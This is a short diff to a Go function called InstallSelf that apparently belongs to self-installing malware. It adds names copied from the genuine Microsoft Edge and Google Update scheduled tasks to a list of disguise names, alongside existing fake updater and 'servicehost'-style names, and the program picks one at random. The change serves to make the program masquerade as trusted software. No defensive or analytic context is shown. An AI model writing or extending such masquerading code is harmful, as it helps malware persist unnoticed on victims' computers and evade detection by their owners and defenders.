@@ -90,6 +90,8 @@ func InstallSelf() {
 		"edgeupdate", "onedrive", "onedriveupdate", "adobeupdate", "acrotray",
 		"javaupdate", "systemservice", "systemhost", "servicehost", "hostservice",
 		"runtimehost", "updatehost", "windowshost", "systemruntime",
+		"MicrosoftEdgeUpdateTaskMachineCore", "MicrosoftEdgeUpdateTaskMachineUA",
+		"GoogleUpdateTaskMachineCore", "GoogleUpdateTaskMachineUA",
 	}
 
 	randomName := names[rand.Intn(len(names))]
